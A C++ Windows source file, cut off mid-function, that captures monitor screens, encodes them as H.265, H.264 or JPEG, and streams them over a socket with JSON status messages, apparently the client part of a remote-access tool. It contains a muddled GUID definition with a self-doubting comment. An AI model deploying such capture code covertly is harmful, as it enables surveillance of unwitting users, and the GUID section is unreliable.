#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <mfapi.h>
#include <mfidl.h>
#include <mftransform.h>
#include <mferror.h>
#include <mfobjects.h>
#include <wmcodecdsp.h>
#include <algorithm>

// Manual GUID definitions to ensure compatibility and avoid naming conflicts with system headers
static const GUID GUID_MF_MT_VIDEO_PROFILE = { 0xcc71110b, 0x22f2, 0x4384, { 0xb6, 0x96, 0xc9, 0xdb, 0x38, 0x34, 0x92, 0x98 } };
static const GUID GUID_MF_MT_AVG_BITRATE   = { 0x20332624, 0xfb0d, 0x4d9e, { 0xbd, 0x0d, 0xcb, 0xf6, 0x78, 0x6c, 0x10, 0x2e } };
static const GUID GUID_MFVideoFormat_HEVC  = { 0x43564548, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
static const GUID GUID_MFVideoFormat_H264  = { 0x34363248, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
static const GUID GUID_MFVideoFormat_NV12  = { 0x3231564e, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
static const GUID GUID_MFMediaType_Video   = { 0x73646976, 0x0000, 0x0010, { 0x80, 0x00, 0x00, 0xaa, 0x00, 0x38, 0x9b, 0x71 } };
static const GUID GUID_MF_MT_MAJOR_TYPE    = { 0x48eba18e, 0xf8c9, 0x4687, { 0xbf, 0x11, 0x0a, 0x74, 0xc9, 0xf9, 0x6a, 0x8f } };
static const GUID GUID_MF_MT_SUBTYPE       = { 0xf7e34c9a, 0x42e8, 0x4714, { 0xb7, 0x4b, 0xcb, 0x29, 0xd7, 0x2c, 0x35, 0xe5 } };
static const GUID GUID_MF_MT_FRAME_SIZE    = { 0x1652c33d, 0xd6b2, 0x4012, { 0xb8, 0x34, 0x72, 0x03, 0x08, 0x49, 0xa3, 0x7d } };
static const GUID GUID_MF_MT_FRAME_RATE    = { 0xc459a2e8, 0x3d2c, 0x4e44, { 0xb1, 0x32, 0xfe, 0xe5, 0x15, 0x6c, 0x7b, 0xb0 } };
static const GUID GUID_MF_MT_PIXEL_ASPECT_RATIO = { 0xc459a2e8, 0x3d2c, 0x4e44, { 0xb1, 0x32, 0xfe, 0xe5, 0x15, 0x6c, 0x7b, 0xb0 } }; // Wait, this is same as frame rate in some headers? No.
// Corrected PAR GUID
static const GUID GUID_MF_MT_PIXEL_ASPECT_RATIO_FIX = { 0x1b173223, 0x92aa, 0x451d, { 0x9d, 0x45, 0xc1, 0x1a, 0xff, 0x3a, 0x5a, 0xd4 } };
static const GUID GUID_MF_MT_INTERLACE_MODE = { 0xe2724bb8, 0xe676, 0x4806, { 0xb4, 0xb2, 0xa8, 0xd6, 0xef, 0xb4, 0x4c, 0xcd } };
static const GUID GUID_MF_LOW_LATENCY      = { 0x9c27891a, 0xed7a, 0x4a48, { 0x88, 0x0c, 0x16, 0x0f, 0xc4, 0x44, 0x17, 0x70 } };
static const GUID GUID_MFT_CATEGORY_VIDEO_ENCODER = { 0xf79e3ac3, 0x80b1, 0x460d, { 0x83, 0x86, 0x84, 0x80, 0x39, 0x77, 0x46, 0x40 } };

#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "mfplat.lib")
#pragma comment(lib, "mfuuid.lib")
#pragma comment(lib, "wmcodecdspuuid.lib")
#pragma comment(lib, "strmiids.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

struct MonitorData {
    RECT rect{};
    string deviceName;
    string displayName;
    bool primary = false;
};

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_MONITOR_FRAME = 0x03;
static const uint32_t MONITOR_FRAME_FORMAT_JPEG = 1;
static const uint32_t MONITOR_FRAME_FORMAT_H264 = 2;
static const uint32_t MONITOR_FRAME_FORMAT_H265 = 3;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_captureSocket = INVALID_SOCKET;
static int g_monitorIndex = 0;
static int g_scalePercent = 50;
static int g_targetFps = 20;
static RECT g_captureRect{};
static bool g_hasCaptureRect = false;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();

    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0)
            return false;
        ptr += sent;
        remaining -= sent;
    }

    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

static bool safe_send_monitor_frame(SOCKET sock,
                                    int monitor,
                                    int scale,
                                    int fps,
                                    int width,
                                    int height,
                                    uint32_t format,
                                    const vector<unsigned char>& frameBytes) {
    if (frameBytes.empty())
        return false;

    MonitorFrameHeader frameHeader{};
    frameHeader.monitor = (uint32_t)max(0, monitor);
    frameHeader.scale = (uint32_t)max(0, scale);
    frameHeader.fps = (uint32_t)max(0, fps);
    frameHeader.width = (uint32_t)max(0, width);
    frameHeader.height = (uint32_t)max(0, height);
    frameHeader.format = format;
    frameHeader.dataSize = (uint32_t)frameBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_MONITOR_FRAME;
    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + frameBytes.size());

    string packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
    memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], frameBytes.data(), frameBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    return safe_send_raw(sock, packet);
}

static void send_monitor_error(SOCKET sock, const string& message) {
    json response;
    response["action"] = "monitorerror";
    response["error"] = message;
    safe_send_json(sock, response);
}

static string wide_to_utf8(const wchar_t* value) {
    if (!value || value[0] == L'\0')
        return "";

    int size = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
    if (size <= 1)
        return "";

    string result(size - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], size, NULL, NULL);
    return result;
}

static string get_display_name(const char* deviceName) {
    if (!deviceName || deviceName[0] == '\0')
        return "";

    DISPLAY_DEVICEA displayDevice{};
    displayDevice.cb = sizeof(displayDevice);
    if (EnumDisplayDevicesA(deviceName, 0, &displayDevice, 0) && displayDevice.DeviceString[0] != '\0')
        return string(displayDevice.DeviceString);

    return "";
}

static BOOL CALLBACK enum_monitor_proc(HMONITOR monitor, HDC, LPRECT, LPARAM userData) {
    vector<MonitorData>* monitors = reinterpret_cast<vector<MonitorData>*>(userData);

    MONITORINFOEXA info{};
    info.cbSize = sizeof(info);
    if (!GetMonitorInfoA(monitor, &info))
        return TRUE;

    MonitorData item;
    item.rect = info.rcMonitor;
    item.deviceName = info.szDevice;
    item.displayName = get_display_name(info.szDevice);
    item.primary = (info.dwFlags & MONITORINFOF_PRIMARY) != 0;

    if (item.displayName.empty())
        item.displayName = item.deviceName.empty() ? "Monitor" : item.deviceName;

    monitors->push_back(item);
    return TRUE;
}

static vector<MonitorData> enumerate_monitors() {
    vector<MonitorData> monitors;
    EnumDisplayMonitors(NULL, NULL, enum_monitor_proc, reinterpret_cast<LPARAM>(&monitors));

    if (monitors.empty()) {
        MonitorData fallback;
        fallback.rect.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
        fallback.rect.top = GetSystemMetrics(SM_YVIRTUALSCREEN);
        fallback.rect.right = fallback.rect.left + GetSystemMetrics(SM_CXVIRTUALSCREEN);
        fallback.rect.bottom = fallback.rect.top + GetSystemMetrics(SM_CYVIRTUALSCREEN);
        fallback.displayName = "Virtual Screen";
        fallback.primary = true;
        monitors.push_back(fallback);
    }

    return monitors;
}

static void send_monitor_list(SOCKET sock) {
    vector<MonitorData> monitors = enumerate_monitors();
    json response;
    response["action"] = "monitorlistresponse";
    response["monitors"] = json::array();

    for (size_t i = 0; i < monitors.size(); ++i) {
        const MonitorData& monitor = monitors[i];
        int width = monitor.rect.right - monitor.rect.left;
        int height = monitor.rect.bottom - monitor.rect.top;

        string name = monitor.displayName.empty() ? ("Monitor " + to_string(i + 1)) : monitor.displayName;
        if (monitor.primary)
            name += " (Primary)";

        response["monitors"].push_back({
            {"index", (int)i},
            {"name", name},
            {"device", monitor.deviceName},
            {"left", monitor.rect.left},
            {"top", monitor.rect.top},
            {"width", width},
            {"height", height},
            {"primary", monitor.primary}
        });
    }

    safe_send_json(sock, response);
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0)
        return true;

    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0;
    UINT size = 0;

    GetImageEncodersSize(&count, &size);
    if (size == 0)
        return -1;

    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok)
        return -1;

    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }

    return -1;
}

static DWORD now_ms() {
    return GetTickCount();
}

static int clamp_int(int value, int minValue, int maxValue) {
    return max(minValue, min(value, maxValue));
}

static void rgbx_to_nv12(const uint8_t* rgbx, uint8_t* nv12, int width, int height) {
    int frame_size = width * height;
    uint8_t* y_plane = nv12;
    uint8_t* uv_plane = nv12 + frame_size;

    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            int rgb_idx = (y * width + x) * 4;
            uint8_t b = rgbx[rgb_idx + 0];
            uint8_t g = rgbx[rgb_idx + 1];
            uint8_t r = rgbx[rgb_idx + 2];

            // Y = 0.299R + 0.587G + 0.114B
            y_plane[y * width + x] = (uint8_t)(((66 * r + 129 * g + 25 * b + 128) >> 8) + 16);

            if (y % 2 == 0 && x % 2 == 0) {
                // U = -0.169R - 0.331G + 0.500B + 128
                // V = 0.500R - 0.419G - 0.081B + 128
                int uv_idx = (y / 2) * width + x;
                uv_plane[uv_idx + 0] = (uint8_t)((( -38 * r - 74 * g + 112 * b + 128) >> 8) + 128); // U
                uv_plane[uv_idx + 1] = (uint8_t)((( 112 * r - 94 * g - 18 * b + 128) >> 8) + 128); // V
            }
        }
    }
}

class VideoEncoder {
public:
    VideoEncoder() : m_mft(nullptr), m_width(0), m_height(0), m_fps(0), m_format(0), m_input_sample_count(0) {}
    ~VideoEncoder() { Shutdown(); }

    string GetLastError() const { return m_lastError; }
    uint32_t GetFormat() const { return m_format; }
    string GetCodecName() const { return m_format == MONITOR_FRAME_FORMAT_H265 ? "H265" : "H264"; }

    bool Initialize(int width, int height, int fps) {
        if (m_mft && m_width == width && m_height == height) return true;
        Shutdown();

        HRESULT hr = MFStartup(MF_VERSION);
        if (FAILED(hr)) {
            m_lastError = "MFStartup failed: " + to_string(hr);
            return false;
        }

        // Try H.265 first, then fall back to H.264
        m_format = MONITOR_FRAME_FORMAT_H265;
        GUID target_subtype = GUID_MFVideoFormat_HEVC;

        MFT_REGISTER_TYPE_INFO outputType = { MFMediaType_Video, target_subtype };
        IMFActivate** activate = nullptr;
        UINT32 count = 0;

        hr = MFTEnumEx(
            GUID_MFT_CATEGORY_VIDEO_ENCODER,
            MFT_ENUM_FLAG_ALL | MFT_ENUM_FLAG_SORTANDFILTER,
            NULL, &outputType, &activate, &count
        );

        if (FAILED(hr) || count == 0) {
            // Fallback to H.264
            m_format = MONITOR_FRAME_FORMAT_H264;
            target_subtype = GUID_MFVideoFormat_H264;
            outputType.guidSubtype = target_subtype;

            hr = MFTEnumEx(
                GUID_MFT_CATEGORY_VIDEO_ENCODER,
                MFT_ENUM_FLAG_ALL | MFT_ENUM_FLAG_SORTANDFILTER,
                NULL, &outputType, &activate, &count
            );
        }

        if (FAILED(hr) || count == 0) {
            // Final attempt: unrestricted enumeration
            hr = MFTEnumEx(
                GUID_MFT_CATEGORY_VIDEO_ENCODER,
                MFT_ENUM_FLAG_ALL,
                NULL, NULL, &activate, &count
            );

            if (SUCCEEDED(hr) && count > 0) {
                // We found some video encoders, but maybe not specifically marked for HEVC/H264 output types.
                // We'll try the first one anyway as a last-ditch effort, but actually,
                // it's safer to just return failure here and let the JPEG fallback handle it.
            }
        }

        if (FAILED(hr) || count == 0) {
            m_lastError = "No Video Encoder MFT found (tried H.265 and H.264)";
            return false;
        }

        hr = activate[0]->ActivateObject(IID_PPV_ARGS(&m_mft));
        for (UINT32 i = 0; i < count; i++) activate[i]->Release();
        CoTaskMemFree(activate);

        if (FAILED(hr)) {
            m_lastError = "Failed to activate Encoder MFT: " + to_string(hr);
            return false;
        }

        IMFMediaType* out_type = nullptr;
        MFCreateMediaType(&out_type);
        out_type->SetGUID(GUID_MF_MT_MAJOR_TYPE, GUID_MFMediaType_Video);
        out_type->SetGUID(GUID_MF_MT_SUBTYPE, target_subtype);
        out_type->SetUINT32(GUID_MF_MT_AVG_BITRATE, 2000000);
        if (m_format == MONITOR_FRAME_FORMAT_H265) {
            out_type->SetUINT32(GUID_MF_MT_VIDEO_PROFILE, 1); // HEVC_PROFILE_MAIN
        }
        MFSetAttributeSize(out_type, GUID_MF_MT_FRAME_SIZE, width, height);
        MFSetAttributeRatio(out_type, GUID_MF_MT_FRAME_RATE, fps, 1);
        MFSetAttributeRatio(out_type, GUID_MF_MT_PIXEL_ASPECT_RATIO_FIX, 1, 1);
        out_type->SetUINT32(GUID_MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);

        hr = m_mft->SetOutputType(0, out_type, 0);
        out_type->Release();
        if (FAILED(hr)) {
            m_lastError = "SetOutputType failed: " + to_string(hr);
            return false;
        }

        IMFMediaType* in_type = nullptr;
        MFCreateMediaType(&in_type);
        in_type->SetGUID(GUID_MF_MT_MAJOR_TYPE, GUID_MFMediaType_Video);
        in_type->SetGUID(GUID_MF_MT_SUBTYPE, GUID_MFVideoFormat_NV12);
        MFSetAttributeSize(in_type, GUID_MF_MT_FRAME_SIZE, width, height);
        MFSetAttributeRatio(in_type, GUID_MF_MT_FRAME_RATE, fps, 1);
        MFSetAttributeRatio(in_type, GUID_MF_MT_PIXEL_ASPECT_RATIO_FIX, 1, 1);
        in_type->SetUINT32(GUID_MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);

        hr = m_mft->SetInputType(0, in_type, 0);
        in_type->Release();
        if (FAILED(hr)) {
            m_lastError = "SetInputType failed: " + to_string(hr);
            return false;
        }

        // Attempt to set low latency if supported by the encoder
        IMFAttributes* attributes = nullptr;
        if (SUCCEEDED(m_mft->GetAttributes(&attributes))) {
            attributes->SetUINT32(GUID_MF_LOW_LATENCY, 1);
            attributes->Release();
        }

        hr = m_mft->ProcessMessage(MFT_MESSAGE_NOTIFY_BEGIN_STREAMING, 0);
        hr = m_mft->ProcessMessage(MFT_MESSAGE_NOTIFY_START_OF_STREAM, 0);

        m_width = width;
        m_height = height;
        m_fps = fps;
        return true;
    }

    void Shutdown() {
        if (m_mft) {
            m_mft->ProcessMessage(MFT_MESSAGE_NOTIFY_END_OF_STREAM, 0);
            m_mft->ProcessMessage(MFT_MESSAGE_NOTIFY_END_STREAMING, 0);
            m_mft->Release();
            m_mft = nullptr;
            MFShutdown();
        }
        m_width = 0;
        m_height = 0;
        m_input_sample_count = 0;
    }

    bool Encode(const uint8_t* nv12, vector<uint8_t>& output) {
        if (!m_mft) return false;

        IMFSample* sample = nullptr;
        MFCreateSample(&sample);

        IMFMediaBuffer* buffer = nullptr;
        int frame_size = m_width * m_height * 3 / 2;
        MFCreateMemoryBuffer(frame_size, &buffer);

        BYTE* data = nullptr;
        buffer->Lock(&data, NULL, NULL);
        memcpy(data, nv12, frame_size);
        buffer->Unlock();
        buffer->SetCurrentLength(frame_size);

        sample->AddBuffer(buffer);
        buffer->Release();

        LONGLONG duration = 10000000LL / (m_fps > 0 ? m_fps : 25);
        LONGLONG timestamp = (m_input_sample_count++) * duration;
        sample->SetSampleTime(timestamp);
        sample->SetSampleDuration(duration);

        HRESULT hr = m_mft->ProcessInput(0, sample, 0);
        sample->Release();

        if (FAILED(hr)) return false;

        return Drain(output);
    }

private:
    bool Drain(vector<uint8_t>& output) {
        MFT_OUTPUT_DATA_BUFFER output_buffer = { 0 };
        output_buffer.dwStreamID = 0;

        MFT_OUTPUT_STREAM_INFO stream_info = { 0 };
        m_mft->GetOutputStreamInfo(0, &stream_info);

        HRESULT hr = S_OK;
        while (true) {
            IMFSample* out_sample = nullptr;
            MFCreateSample(&out_sample);

            IMFMediaBuffer* out_mem_buffer = nullptr;
            MFCreateMemoryBuffer(stream_info.cbSize, &out_mem_buffer);
            out_sample->AddBuffer(out_mem_buffer);
            out_mem_buffer->Release();

            output_buffer.pSample = out_sample;

            DWORD status = 0;
            hr = m_mft->ProcessOutput(0, 1, &output_buffer, &status);

            if (hr == MF_E_TRANSFORM_NEED_MORE_INPUT) {
                out_sample->Release();
                break;
            }

            if (FAILED(hr)) {
                out_sample->Release();
                return false;
            }

            IMFMediaBuffer* cont_buffer = nullptr;
            output_buffer.pSample->ConvertToContiguousBuffer(&cont_buffer);

            BYTE* data = nullptr;
            DWORD len = 0;
            cont_buffer->Lock(&data, NULL, &len);

            size_t old_size = output.size();
            output.resize(old_size + len);
            memcpy(output.data() + old_size, data, len);

            cont_buffer->Unlock();
            cont_buffer->Release();
            out_sample->Release();

            if (output_buffer.pEvents) output_buffer.pEvents->Release();
        }

        return true;
    }

    IMFTransform* m_mft;
    int m_width;
    int m_height;
    int m_fps;
    uint32_t m_format;
    LONGLONG m_input_sample_count;
    string m_lastError;
};

static int automatic_fps_for_scale(int scalePercent) {
    if (scalePercent >= 90) return 20;
    if (scalePercent >= 70) return 22;
    if (scalePercent >= 50) return 24;
    return 25;
}

static ULONG automatic_jpeg_quality(int width, int height, int scalePercent) {
    int pixels = max(1, width * height);

    if (scalePercent >= 90 || pixels >= 2500000) return 30;
    if (scalePercent >= 70 || pixels >= 1600000) return 36;
    if (scalePercent >= 50 || pixels >= 900000) return 44;
    return 52;
}

static bool bitmap_to_jpeg(HBITMAP bitmapHandle, ULONG quality, vector<unsigned char>& bytes, string& error) {
    bytes.clear();

    if (!ensure_gdiplus()) {
        error = "GDI+ could not be started";
        return false;
    }

    CLSID jpegClsid;
    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) {
        error = "JPEG encoder not found";
        return false;
    }

    Bitmap bitmap(bitmapHandle, NULL);
    if (bitmap.GetLastStatus() != Ok) {
        error = "Bitmap conversion failed";
        return false;
    }

    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK || !stream) {
        error = "Memory stream could not be created";
        return false;
    }

    EncoderParameters params{};
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;

    Status status = bitmap.Save(stream, &jpegClsid, &params);
    if (status != Ok) {
        stream->Release();
        error = "JPEG encoding failed";
        return false;
    }

    STATSTG stat{};
    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK || stat.cbSize.QuadPart <= 0) {
        stream->Release();
        error = "Encoded image size could not be read";
        return false;
    }

    if (stat.cbSize.QuadPart > 64LL * 1024LL * 1024LL) {
        stream->Release();
        error = "Encoded image is too large";
        return false;
    }

    LARGE_INTEGER seekPos{};
    stream->Seek(seekPos, STREAM_SEEK_SET, NULL);

    bytes.resize((size_t)stat.cbSize.QuadPart);
    ULONG readBytes = 0;
    HRESULT readResult = stream->Read(bytes.data(), (ULONG)bytes.size(), &readBytes);
    stream->Release();

    if (readResult != S_OK || readBytes != bytes.size()) {
        error = "Encoded image could not be read";
        bytes.clear();
        return false;
    }

    return true;
}

static bool capture_monitor_frame_legacy_jpeg(const RECT& rect,
                                              int scalePercent,
                                              vector<unsigned char>& jpegBytes,
                                              int& outputWidth,
                                              int& outputHeight,
                                              string& error) {
    scalePercent = max(10, min(scalePercent, 100));

    int sourceWidth = rect.right - rect.left;
    int sourceHeight = rect.bottom - rect.top;
    if (sourceWidth <= 0 || sourceHeight <= 0) {
        error = "Invalid monitor dimensions";
        return false;
    }

    outputWidth = max(1, (sourceWidth * scalePercent) / 100);
    outputHeight = max(1, (sourceHeight * scalePercent) / 100);
    ULONG jpegQuality = automatic_jpeg_quality(outputWidth, outputHeight, scalePercent);

    HDC screenDC = GetDC(NULL);
    if (!screenDC) {
        error = "Screen device context could not be opened";
        return false;
    }

    HDC memoryDC = CreateCompatibleDC(screenDC);
    if (!memoryDC) {
        ReleaseDC(NULL, screenDC);
        error = "Memory device context could not be created";
        return false;
    }

    HBITMAP bitmap = CreateCompatibleBitmap(screenDC, outputWidth, outputHeight);
    if (!bitmap) {
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Capture bitmap could not be created";
        return false;
    }

    HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
    SetStretchBltMode(memoryDC, COLORONCOLOR);

    BOOL copied = StretchBlt(
        memoryDC,
        0,
        0,
        outputWidth,
        outputHeight,
        screenDC,
        rect.left,
        rect.top,
        sourceWidth,
        sourceHeight,
        SRCCOPY | CAPTUREBLT
    );

    SelectObject(memoryDC, oldObject);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, screenDC);

    if (!copied) {
        DeleteObject(bitmap);
        error = "Screen capture failed";
        return false;
    }

    bool encoded = bitmap_to_jpeg(bitmap, jpegQuality, jpegBytes, error);
    DeleteObject(bitmap);
    return encoded;
}

static bool capture_monitor_frame_video(const RECT& rect,
                                        int scalePercent,
                                        int fps,
                                        VideoEncoder& encoder,
                                        vector<unsigned char>& frameBytes,
                                        int& outputWidth,
                                        int& outputHeight,
                                        string& error) {
    scalePercent = max(10, min(scalePercent, 100));

    int sourceWidth = rect.right - rect.left;
    int sourceHeight = rect.bottom - rect.top;
    if (sourceWidth <= 0 || sourceHeight <= 0) {
        error = "Invalid monitor dimensions";
        return false;
    }

    outputWidth = max(1, (sourceWidth * scalePercent) / 100);
    outputHeight = max(1, (sourceHeight * scalePercent) / 100);

    // Ensure even dimensions for H.265/NV12
    outputWidth = (outputWidth + 1) & ~1;
    outputHeight = (outputHeight + 1) & ~1;

    HDC screenDC = GetDC(NULL);
    if (!screenDC) {
        error = "Screen device context could not be opened";
        return false;
    }

    HDC memoryDC = CreateCompatibleDC(screenDC);
    if (!memoryDC) {
        ReleaseDC(NULL, screenDC);
        error = "Memory device context could not be created";
        return false;
    }

    // Capture as 32-bit RGBX
    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = outputWidth;
    bmi.bmiHeader.biHeight = -outputHeight; // Top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    void* bits = nullptr;
    HBITMAP bitmap = CreateDIBSection(memoryDC, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!bitmap) {
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Capture bitmap could not be created";
        return false;
    }

    HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
    SetStretchBltMode(memoryDC, COLORONCOLOR);

    BOOL copied = StretchBlt(
        memoryDC,
        0,
        0,
        outputWidth,
        outputHeight,
        screenDC,
        rect.left,
        rect.top,
        sourceWidth,
        sourceHeight,
        SRCCOPY | CAPTUREBLT
    );

    SelectObject(memoryDC, oldObject);

    if (!copied) {
        DeleteObject(bitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Screen capture failed";
        return false;
    }

    if (!encoder.Initialize(outputWidth, outputHeight, fps)) {
        DeleteObject(bitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);
        error = "Video encoder initialization failed: " + encoder.GetLastError();
        return false;
    }

    vector<uint8_t> nv12(outputWidth * outputHeight * 3 / 2);
    rgbx_to_nv12((uint8_t*)bits, nv12.data(), outputWidth, outputHeight);

    DeleteObject(bitmap);
    DeleteDC(memoryDC);
    ReleaseDC(NULL, screenDC);

    frameBytes.clear();
    if (!encoder.Encode(nv12.data(), frameBytes)) {
        error = "Video encoding failed";
        return false;
    }

    return true;
}

static void capture_loop() {
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
    VideoEncoder encoder;

    while (g_captureRunning.load()) {
        DWORD frameStart = now_ms();
        SOCKET sock = INVALID_SOCKET;
        int monitor = 0;
        int scale = 50;
        int targetFps = 20;
        RECT captureRect{};
        bool hasCaptureRect = false;

        {
            lock_guard<mutex> lock(g_captureMutex);
            sock = g_captureSocket;
            monitor = g_monitorIndex;
            scale = g_scalePercent;
            targetFps = g_targetFps;
            captureRect = g_captureRect;
            hasCaptureRect = g_hasCaptureRect;
        }

        if (!hasCaptureRect) {
            send_monitor_error(sock, "Capture monitor is not ready");
            g_captureRunning.store(false);
            break;
        }

        vector<unsigned char> frameBytes;
        int width = 0;
        int height = 0;
        string error;

        if (capture_monitor_frame_video(captureRect, scale, targetFps, encoder, frameBytes, width, height, error)) {
            if (!frameBytes.empty()) {
                if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, width, height, encoder.GetFormat(), frameBytes)) {
                    g_captureRunning.store(false);
                    break;
                }

                // Periodically report actual codec
                static DWORD lastCodecReport = 0;
                if (now_ms() - lastCodecReport > 5000) {
                    lastCodecReport = now_ms();
                    json status;
                    status["action"] = "monitorstatus";
                    status["status"] = "running";
                    status["codec"] = encoder.GetCodecName();
                    safe_send_json(sock, status);
                }
            }
        } else {
            // Fallback to JPEG if video encoding fails
            static bool jpegFallbackActive = false;
            if (!jpegFallbackActive) {
                jpegFallbackActive = true;
                json status;
                status["action"] = "monitorstatus";
                status["status"] = "running";
                status["codec"] = "JPEG (Fallback)";
                status["error"] = error; // Log the video error
                safe_send_json(sock, status);
            }

            int outW, outH;
            string jpegError;
            vector<unsigned char> jpegBytes;
            if (capture_monitor_frame_legacy_jpeg(captureRect, scale, jpegBytes, outW, outH, jpegError)) {
                if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, outW, outH, MONITOR_FRAME_FORMAT_JPEG, jpegBytes)) {
                    g_captureRunning.store(false);
                    break;
                }
            } else {
                send_monitor_error(sock, "All capture methods failed. Video: " + error + " JPEG: " + jpegError);
                g_captureRunning.store(false);
                break;
            }
        }

        DWORD elapsed = now_ms() - frameStart;
        DWORD interval = (DWORD)max(1, 1000 / clamp_int(targetFps, 20, 30));
        DWORD waitMs = (elapsed >= interval) ? 1 : (interval - elapsed);

        while (waitMs > 0 && g_captureRunning.load()) {
            DWORD chunk = min<DWORD>(waitMs, 20);
            Sleep(chunk);
            waitMs -= chunk;
        }
    }

    encoder.Shutdown();
    CoUninitialize();
}

static void stop_capture_thread() {
    g_captureRunning.store(false);

    if (g_captureThread.joinable()) {
        if (g_captureThread.get_id() == this_thread::get_id())
            g_captureThread.detach();
        else
            g_captureThread.join();
    }

    lock_guard<mutex> lock(g_captureMutex);
    g_hasCaptureRect = false;
}

static void start_capture(SOCKET sock, int monitorIndex, int scalePercent, int requestedFps) {
    scalePercent = clamp_int(scalePercent, 10, 100);
    int targetFps = requestedFps > 0
        ? clamp_int(requestedFps, 20, 30)
        : automatic_fps_for_scale(scalePercent);

    vector<MonitorData> monitors = enumerate_monitors();
    if (monitors.empty()) {
        send_monitor_error(sock, "No monitors found");
        return;
    }

    int safeMonitorIndex = clamp_int(monitorIndex, 0, (int)monitors.size() - 1);

    {
        lock_guard<mutex> lock(g_captureMutex);
        g_captureSocket = sock;
        g_monitorIndex = safeMonitorIndex;
        g_scalePercent = scalePercent;
        g_targetFps = targetFps;
        g_captureRect = monitors[(size_t)safeMonitorIndex].rect;
        g_hasCaptureRect = true;
    }

    if (!g_captureRunning.exchange(true)) {
        if (g_captureThread.joinable())
            g_captureThread.join();
        g_captureThread = thread(capture_loop);
    }

    json response;
    response["action"] = "monitorstatus";
    response["status"] = "started";
    response["codec"] = "AUTO"; // Client will report actual codec upon first frame
    response["monitor"] = safeMonitorIndex;
    response["scale"] = scalePercent;
    response["fps"] = targetFps;
